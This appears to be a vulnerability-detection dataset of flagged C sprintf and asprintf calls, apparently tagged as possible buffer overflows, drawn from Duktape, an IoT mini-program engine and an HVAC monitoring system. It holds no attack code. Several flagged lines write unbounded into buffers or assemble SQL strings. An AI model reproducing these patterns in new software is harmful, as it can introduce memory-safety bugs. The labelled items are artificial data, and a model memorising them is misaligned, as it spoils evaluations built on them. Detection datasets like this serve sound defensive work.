		duk_fb_sprintf(fb, ""?(%ld)"", (long) opcode);
	} else {
		duk_fb_sprintf(fb, ""%s"", (const char *) duk__bc_optab[opcode]);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%s"", (const char *) duk__bc_optab[opcode]);",120,1,"		duk_fb_sprintf(fb, ""?(%ld)"", (long) opcode);
	} else {
		duk_fb_sprintf(fb, ""%s"", (const char *) duk__bc_optab[opcode]);
	}
}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[catcher ptr=%p parent=%p varname=%p pc_base=%p, idx_base=%ld, flags=0x%08lx]"",",120,1,"	}

	duk_fb_sprintf(fb, ""[catcher ptr=%p parent=%p varname=%p pc_base=%p, idx_base=%ld, flags=0x%08lx]"",
	               (void *) cat,
	               (void *) cat->parent, (void *) cat->h_varname, (void *) cat->pc_base,
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[activation ptr=%p tv_func=<omit> func=%p parent=%p var_env=%p lex_env=%p cat=%p curr_pc=%p bottom_byteoff=%ld retval_byteoff=%ld reserve_byteoff=%ld flags=%ld]"",",120,1,"	/* prev_caller: conditional, omitted on purpose, it's rarely used. */
	/* prev_line: conditional, omitted on purpose (but would be nice). */
	duk_fb_sprintf(fb, ""[activation ptr=%p tv_func=<omit> func=%p parent=%p var_env=%p lex_env=%p cat=%p curr_pc=%p bottom_byteoff=%ld retval_byteoff=%ld reserve_byteoff=%ld flags=%ld]"",
	               (void *) act,
	               (void *) act->func, (void *) act->parent, (void *) act->var_env,
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(&fb, ""(%p)"", (void *) t);",120,1,"				duk_tval *t = va_arg(ap, duk_tval *);
				if (st.pointer && !st.heavy) {
					duk_fb_sprintf(&fb, ""(%p)"", (void *) t);
				}
				duk__print_tval(&st, t);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(&fb, fmtbuf, arg);",120,1,"					/* %f and %lf both consume a 'long' */
					double arg = va_arg(ap, double);
					duk_fb_sprintf(&fb, fmtbuf, arg);
				} else if (ch == DUK_ASC_LC_D && got_long) {
					/* %ld */
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(&fb, ""NULL"");",120,1,"						 * it for debug printing.
						 */
						duk_fb_sprintf(&fb, ""NULL"");
					} else {
						duk_fb_sprintf(&fb, fmtbuf, arg);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(&fb, ""INVALID-FORMAT(%s)"", (const char *) fmtbuf);",120,1,"				} else {
					/* Should not happen. */
					duk_fb_sprintf(&fb, ""INVALID-FORMAT(%s)"", (const char *) fmtbuf);
				}
				break;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_push_sprintf(thr, "" (line %ld%s)"",",120,1,"		                 (long) thr->compile_ctx->lex.window[1].codepoint));

		duk_push_sprintf(thr, "" (line %ld%s)"",
		                 (long) thr->compile_ctx->curr_token.start_line,
		                 at_end ? "", end of input"" : """");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.h,"DUK_EXTERNAL_DECL const char *duk_push_sprintf(duk_context *ctx, const char *fmt, ...);",120,1,"DUK_EXTERNAL_DECL const char *duk_push_lstring(duk_context *ctx, const char *str, duk_size_t len);
DUK_EXTERNAL_DECL void duk_push_pointer(duk_context *ctx, void *p);
DUK_EXTERNAL_DECL const char *duk_push_sprintf(duk_context *ctx, const char *fmt, ...);
DUK_EXTERNAL_DECL const char *duk_push_vsprintf(duk_context *ctx, const char *fmt, va_list ap);

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.h,"DUK_EXTERNAL_DECL const char *duk_push_vsprintf(duk_context *ctx, const char *fmt, va_list ap);",120,1,"DUK_EXTERNAL_DECL void duk_push_pointer(duk_context *ctx, void *p);
DUK_EXTERNAL_DECL const char *duk_push_sprintf(duk_context *ctx, const char *fmt, ...);
DUK_EXTERNAL_DECL const char *duk_push_vsprintf(duk_context *ctx, const char *fmt, va_list ap);

/* duk_push_literal() may evaluate its argument (a C string literal) more than
"
2021\haas-mini-program\engine\lite_engine\core\be.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be.c,"sprintf(tmpPath, ""./%s"", name);",120,1,"    /* add ""./"" */
    char *tmpPath = amp_calloc(1, 3 + strlen(name));
    sprintf(tmpPath, ""./%s"", name);
    char *clearPath   = getClearPath(tmpPath);
    firstDir->dirname = getFilePath(clearPath);
"
2021\haas-mini-program\engine\lite_engine\core\be_executor.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_executor.c,"sprintf(errMsg, ""OBJ:%s"", objectName);",120,1,"                                } else {
#ifndef BE_JSE_SILENT
                                    sprintf(errMsg, ""OBJ:%s"", objectName);
                                    be_amp_error_at(errMsg, vm.lex,
                                                    vm.lex->token_last_end);
"
2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,"sprintf(evalstr, ""(%.*s)"", json_str_len, json_str);",120,1,"    char *s2 = strchr(json_str, '{');
    if ((s1 && (s1 - json_str) == 0) || (s2 && (s2 - json_str) == 0)) {
        sprintf(evalstr, ""(%.*s)"", json_str_len, json_str);
    } else {
        sprintf(evalstr, ""(%.*s)"", (int)strlen(""({})""), ""({})"");
"
2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_symbol.c,"sprintf(evalstr, ""(%.*s)"", (int)strlen(""({})""), ""({})"");",120,1,"        sprintf(evalstr, ""(%.*s)"", json_str_len, json_str);
    } else {
        sprintf(evalstr, ""(%.*s)"", (int)strlen(""({})""), ""({})"");
    }

"
2021\haas-mini-program\engine\lite_engine\core\be_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_utils.c,"sprintf(fullPath, ""%s/%s"", JSE_FS_ROOT_DIR, path);",120,1,"    path_len = strlen(path) + 128;
    fullPath = amp_calloc(1, path_len);
    sprintf(fullPath, ""%s/%s"", JSE_FS_ROOT_DIR, path);

    /* clear ./ */
"
2021\haas-mini-program\engine\lite_engine\core\be_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_utils.c,"sprintf(fullPath, ""%s"", json_data);",120,1,"    /* clear ./ */
    json_data = getClearPath(fullPath);
    sprintf(fullPath, ""%s"", json_data);
    amp_free(json_data);

"
2021\haas-mini-program\engine\lite_engine\core\be_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_utils.c,"sprintf(fullPath, ""%s/%s"", path, item->valuestring);",120,1,"        if (NULL != item && aJSON_String == item->type &&
            strstr(item->valuestring, "".js"")) {
            sprintf(fullPath, ""%s/%s"", path, item->valuestring);

            amp_free(json_data);
"
2021\haas-mini-program\engine\lite_engine\core\be_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\core\be_utils.c,"sprintf(fullPath, ""%s/src/%s"", path, ""index.js"");",120,1,"               __LINE__, fullPath);
        /* default index.js */
        sprintf(fullPath, ""%s/src/%s"", path, ""index.js"");
        return fullPath;
    } else {
"
2021\haas-mini-program\engine\lite_engine\include\be_utils.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\include\be_utils.h,"#define itoa(val, str, base) sprintf(str, ""%d"", val)",120,1,"#endif

#define itoa(val, str, base) sprintf(str, ""%d"", val)
#define ftoa(val, str) sprintf(str, ""%g"", val)

"
2021\haas-mini-program\engine\lite_engine\include\be_utils.h,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\lite_engine\include\be_utils.h,"#define ftoa(val, str) sprintf(str, ""%g"", val)",120,1,"
#define itoa(val, str, base) sprintf(str, ""%d"", val)
#define ftoa(val, str) sprintf(str, ""%g"", val)

#if defined(__GNUC__) && !defined(__clang__)
"
2021\haas-mini-program\services\amp_utils\amp_utils.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\amp_utils\amp_utils.c,"sprintf((char *)ascii + i % 16, ""%c"",",120,1,"            written += 1;
        }
        sprintf((char *)ascii + i % 16, ""%c"",
                ((buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.'));

"
2021\haas-mini-program\services\app_mgr\app_mgr.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\app_mgr\app_mgr.c,"sprintf(msg, ""%d/%d"", jspacksize, header.pack_size);",120,1,"    char msg[128];
    if (jspacksize >= JSEPACK_HEADER_SIZE) {
        sprintf(msg, ""%d/%d"", jspacksize, header.pack_size);
    }
}
"
2021\haas-mini-program\services\app_mgr\app_mgr.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\app_mgr\app_mgr.c,"sprintf(http_buffer, HTTP_HEADER, host_file, host_addr, port);",120,1,"
    breakpoint = 0;
    sprintf(http_buffer, HTTP_HEADER, host_file, host_addr, port);

    send      = 0;
"
2021\haas-mini-program\services\app_mgr\app_mgr.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\services\app_mgr\app_mgr.c,"sprintf(msg, ""%d/%d"", total_recv, upgrade_file_size);",120,1,"
    total_recv += buf_len;
    sprintf(msg, ""%d/%d"", total_recv, upgrade_file_size);

    if (((total_recv - last_buf_len) > OTA_BUFFER_MAX_SIZE * 2) ||
"
2021\haas-mini-program\utils\cJSON\cJSON.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\cJSON\cJSON.c,"sprintf(version, ""%i.%i.%i"", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);",120,1,"{
    static char version[15];
    sprintf(version, ""%i.%i.%i"", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);

    return version;
"
2021\healthyhome\monitoring-server\libs\linux-i2c\src\Driver.cpp,Dataset Download,../../Dataset Download/2021\healthyhome\monitoring-server\libs\linux-i2c\src\Driver.cpp,"sprintf(filename, FILE_PATTERN, deviceId);",120,1,"
    char filename[FILE_NAME_LENGTH];
    sprintf(filename, FILE_PATTERN, deviceId);

    if ((fd = ::open(filename, O_RDWR)) < 0) {
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: invalid PORT"", time(NULL));",120,1,"    if(port_number < MIN_PORT || port_number > MAX_PORT) 
    {
        asprintf(&send_buf, ""%ld Connection Manager: invalid PORT"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: failed to start"", time(NULL));",120,1,"        *retval = CONNMGR_SERVER_OPEN_ERROR; // her setting poll_fds and socket_list to NULL is not needed as it was allocated already
        
        asprintf(&send_buf, ""%ld Connection Manager: failed to start"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
        
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: started successfully"", time(NULL));",120,1,"    }

    asprintf(&send_buf, ""%ld Connection Manager: started successfully"", time(NULL));
    write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: signalled to terminate by Storage Manager"", time(NULL));",120,1,"            *retval = CONNMGR_INTERRUPTED_BY_STORAGEMGR;

            asprintf(&send_buf, ""%ld Connection Manager: signalled to terminate by Storage Manager"", time(NULL));
            write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: failed to accept new connection (%d)"", time(NULL), tcp_conn_res);",120,1,"                *retval = CONNMGR_SERVER_CONNECTION_ERROR;

                asprintf(&send_buf, ""%ld Connection Manager: failed to accept new connection (%d)"", time(NULL), tcp_conn_res);
                write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
            } else
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: new connection received"", time(NULL));",120,1,"                dpl_insert_sorted(socket_list, client, false); // Insert connection into dplist
                
                asprintf(&send_buf, ""%ld Connection Manager: new connection received"", time(NULL));
                write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: lost connection with"", time(NULL));",120,1,"                    poll_fds[i].events = -1;
                    
                    asprintf(&send_buf, ""%ld Connection Manager: lost connection with"", time(NULL));
                    write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
                }
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: signalled to drop connection to %""PRIu16, time(NULL), client->sensor);",120,1,"                    pthread_mutex_unlock(connmgr_drop_conn_mutex);

                    asprintf(&send_buf, ""%ld Connection Manager: signalled to drop connection to %""PRIu16, time(NULL), client->sensor);
                    write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
                } else pthread_mutex_unlock(connmgr_drop_conn_mutex);
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: connection to %""PRIu16"" closed"", time(NULL), client->sensor);",120,1,"                if(client != NULL) 
                {
                    asprintf(&send_buf, ""%ld Connection Manager: connection to %""PRIu16"" closed"", time(NULL), client->sensor);
                    write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
                    
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: error polling sockets"", time(NULL));",120,1,"        *retval = CONNMGR_SERVER_POLL_ERROR;
        
        asprintf(&send_buf, ""%ld Connection Manager: error polling sockets"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
    }
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: failed to stop"", time(NULL));",120,1,"        *retval = CONNMGR_SERVER_CLOSE_ERROR; // close master socket if any
        
        asprintf(&send_buf, ""%ld Connection Manager: failed to stop"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
    } else
"
2021\HVAC-Monitoring-System\connmgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\connmgr.c,"asprintf(&send_buf, ""%ld Connection Manager: stopped successfully"", time(NULL));",120,1,"    } else
    {
        asprintf(&send_buf, ""%ld Connection Manager: stopped successfully"", time(NULL));        
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
    }
"
2021\HVAC-Monitoring-System\datamgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\datamgr.c,"asprintf(&send_buf, ""%ld Data Manager: failed to read room_sensor.map"", time(NULL));",120,1,"        *retval = DATAMGR_FILE_PARSE_ERROR;

        asprintf(&send_buf, ""%ld Data Manager: failed to read room_sensor.map"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\datamgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\datamgr.c,"asprintf(&send_buf, ""%ld Data Manager: started and parsed room_sensor.map successfully"", time(NULL));",120,1,"    } else 
    {
        asprintf(&send_buf, ""%ld Data Manager: started and parsed room_sensor.map successfully"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
    }
"
2021\HVAC-Monitoring-System\datamgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\datamgr.c,"asprintf(&send_buf, ""%ld Data Manager: sensor %"" PRIu16 "" does not exist"", time(NULL), dummy.sensor.id);",120,1,"                fflush(stderr);

                asprintf(&send_buf, ""%ld Data Manager: sensor %"" PRIu16 "" does not exist"", time(NULL), dummy.sensor.id);
                write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
                
"
2021\HVAC-Monitoring-System\datamgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\datamgr.c,"asprintf(&send_buf, ""%ld Data Manager: sensor %"" PRIu16 "" in room %"" PRIu16 "" - too cold %g below %g"", time(NULL), list_el->sensor.id, list_el->room, list_el->sensor.value, (double) SET_MIN_TEMP);",120,1,"                fflush(stderr);

                asprintf(&send_buf, ""%ld Data Manager: sensor %"" PRIu16 "" in room %"" PRIu16 "" - too cold %g below %g"", time(NULL), list_el->sensor.id, list_el->room, list_el->sensor.value, (double) SET_MIN_TEMP);
                
                write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
"
2021\HVAC-Monitoring-System\datamgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\datamgr.c,"asprintf(&send_buf, ""%ld Data Manager: sensor %"" PRIu16 "" in room %"" PRIu16 "" - too hot %g above %g"", time(NULL), list_el->sensor.id, list_el->room, list_el->sensor.value, (double) SET_MAX_TEMP);",120,1,"                fflush(stderr);

                asprintf(&send_buf, ""%ld Data Manager: sensor %"" PRIu16 "" in room %"" PRIu16 "" - too hot %g above %g"", time(NULL), list_el->sensor.id, list_el->room, list_el->sensor.value, (double) SET_MAX_TEMP);
                
                write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
"
2021\HVAC-Monitoring-System\datamgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\datamgr.c,"asprintf(&send_buf, ""%ld Data Manager: signalled to terminate by Storage Manager"", time(NULL));",120,1,"        *retval = DATAMGR_INTERRUPTED_BY_STORAGEMGR;

        asprintf(&send_buf, ""%ld Data Manager: signalled to terminate by Storage Manager"", time(NULL));
        write_to_pipe(ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\datamgr.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\datamgr.c,"asprintf(&send_buf, ""%ld Data Manager: successfully cleaned up"", time(NULL));",120,1,"    char * send_buf;

    asprintf(&send_buf, ""%ld Data Manager: successfully cleaned up"", time(NULL));
    
    write_to_pipe(ipc_pipe_mutex, pfds, send_buf);
"
2021\HVAC-Monitoring-System\main.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\main.c,"asprintf(&buf_to_write, ""%d %s\n"", sequence++, rcv_buf);",120,1,"        while((result = read(pfds[0], rcv_buf, PIPE_BUF)) > 0) // Process will stay in loop
        {
            asprintf(&buf_to_write, ""%d %s\n"", sequence++, rcv_buf);
            fwrite(buf_to_write, strlen(buf_to_write), 1, log_data); // Write data from pipe to log file

"
2021\HVAC-Monitoring-System\main.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\main.c,"asprintf(&msg, ""%d %ld Error reading from pipe, pipe closed\n"", sequence++, time(NULL));",120,1,"        if(result == -1) // If reading from pipe resulted in an error
        {
            asprintf(&msg, ""%d %ld Error reading from pipe, pipe closed\n"", sequence++, time(NULL));
        } else if(result == 0)
        {
"
2021\HVAC-Monitoring-System\main.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\main.c,"asprintf(&msg, ""%d %ld Pipe between parent (%d) and child (%d) terminated normally\n"", sequence++, time(NULL), parent_pid, child_pid);",120,1,"        } else if(result == 0)
        {
            asprintf(&msg, ""%d %ld Pipe between parent (%d) and child (%d) terminated normally\n"", sequence++, time(NULL), parent_pid, child_pid);
        }

"
2021\HVAC-Monitoring-System\main.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\main.c,"asprintf(&send_buf, ""%ld Storage Manager: Failed to start DB server %d times, exitting"", time(NULL), STORAGE_INIT_ATTEMPTS);",120,1,"    {
        char * send_buf;
        asprintf(&send_buf, ""%ld Storage Manager: Failed to start DB server %d times, exitting"", time(NULL), STORAGE_INIT_ATTEMPTS);
        write_to_pipe(&ipc_pipe_mutex, pfds, send_buf);

"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Unable to connect to SQL server"", time(NULL));",120,1,"        fflush(stderr);

        asprintf(&send_buf, ""%ld Storage Manager: Unable to connect to SQL server"", time(NULL));
        
        sqlite3_close(db);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Connected to SQL server"", time(NULL));",120,1,"    } else
    {
        asprintf(&send_buf, ""%ld Storage Manager: Connected to SQL server"", time(NULL));
    }
    
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: %s"", time(NULL), errmsg);",120,1,"            fflush(stderr);

            asprintf(&send_buf, ""%ld Storage Manager: %s"", time(NULL), errmsg);
            
            sqlite3_free(errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: New table ""TO_STRING(TABLE_NAME)"" created"", time(NULL));",120,1,"        } else
        {
            asprintf(&send_buf, ""%ld Storage Manager: New table ""TO_STRING(TABLE_NAME)"" created"", time(NULL));
        }
        
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Unable to disconnect from SQL server - server busy"", time(NULL));",120,1,"        fflush(stderr);

        asprintf(&send_buf, ""%ld Storage Manager: Unable to disconnect from SQL server - server busy"", time(NULL));
    } else
    {
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Disconnected from SQL server"", time(NULL));",120,1,"    } else
    {
        asprintf(&send_buf, ""%ld Storage Manager: Disconnected from SQL server"", time(NULL));
    }

"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&sql, ""INSERT INTO ""TO_STRING(TABLE_NAME)""(sensor_id, sensor_value, timestamp) VALUES(%hu, %e, %ld);"", id, value, ts);",120,1,"    char * sql;

    asprintf(&sql, ""INSERT INTO ""TO_STRING(TABLE_NAME)""(sensor_id, sensor_value, timestamp) VALUES(%hu, %e, %ld);"", id, value, ts);
    
    int rc = sqlite3_exec(conn, sql, NULL, NULL, &errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Data insertion failed::%s"", ts, errmsg);",120,1,"        fflush(stderr);

        asprintf(&send_buf, ""%ld Storage Manager: Data insertion failed::%s"", ts, errmsg);
        
        sqlite3_free(errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Inserted new reading in %s"", ts, TO_STRING(TABLE_NAME));",120,1,"    } else
    {
        asprintf(&send_buf, ""%ld Storage Manager: Inserted new reading in %s"", ts, TO_STRING(TABLE_NAME));
    }

"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: All sensor query failed::%s"", time(NULL), errmsg);",120,1,"        fflush(stderr);

        asprintf(&send_buf, ""%ld Storage Manager: All sensor query failed::%s"", time(NULL), errmsg);
        
        sqlite3_free(errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: All sensor query complete"", time(NULL));",120,1,"    } else
    {
        asprintf(&send_buf, ""%ld Storage Manager: All sensor query complete"", time(NULL));
    }
    
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&sql, ""SELECT * FROM ""TO_STRING(TABLE_NAME)"" WHERE sensor_value = %g ORDER BY id ASC;"", value);",120,1,"    char * sql;

    asprintf(&sql, ""SELECT * FROM ""TO_STRING(TABLE_NAME)"" WHERE sensor_value = %g ORDER BY id ASC;"", value);
    
    int rc = sqlite3_exec(conn, sql, f, NULL, &errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Sensor query by value failed::%s"", time(NULL), errmsg);",120,1,"        fflush(stderr);

        asprintf(&send_buf, ""%ld Storage Manager: Sensor query by value failed::%s"", time(NULL), errmsg);

        sqlite3_free(errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Sensor query by value complete"", time(NULL));",120,1,"    } else
    {
        asprintf(&send_buf, ""%ld Storage Manager: Sensor query by value complete"", time(NULL)); 
    }
    
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&sql, ""SELECT * FROM ""TO_STRING(TABLE_NAME)"" WHERE sensor_value > %g ORDER BY id ASC;"", value);",120,1,"    char * sql;
    
    asprintf(&sql, ""SELECT * FROM ""TO_STRING(TABLE_NAME)"" WHERE sensor_value > %g ORDER BY id ASC;"", value);
    
    int rc = sqlite3_exec(conn, sql, f, NULL, &errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Sensor query GT value failed::%s"", time(NULL), errmsg);",120,1,"        fflush(stderr);

        asprintf(&send_buf, ""%ld Storage Manager: Sensor query GT value failed::%s"", time(NULL), errmsg);

        sqlite3_free(errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Sensor query GT value complete"", time(NULL));",120,1,"    } else 
    {
        asprintf(&send_buf, ""%ld Storage Manager: Sensor query GT value complete"", time(NULL));
    }
    
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&sql, ""SELECT * FROM ""TO_STRING(TABLE_NAME)"" WHERE timestamp = %ld ORDER BY id ASC;"", ts);",120,1,"    char * sql;

    asprintf(&sql, ""SELECT * FROM ""TO_STRING(TABLE_NAME)"" WHERE timestamp = %ld ORDER BY id ASC;"", ts);
    
    int rc = sqlite3_exec(conn, sql, f, NULL, &errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Sensor query by timestamp failed::%s"", time(NULL), errmsg);",120,1,"        fflush(stderr);

        asprintf(&send_buf, ""%ld Storage Manager: Sensor query by timestamp failed::%s"", time(NULL), errmsg);
        
        sqlite3_free(errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Sensor query by timestamp complete"", time(NULL));",120,1,"    } else
    {
        asprintf(&send_buf, ""%ld Storage Manager: Sensor query by timestamp complete"", time(NULL));    
    }
    
"
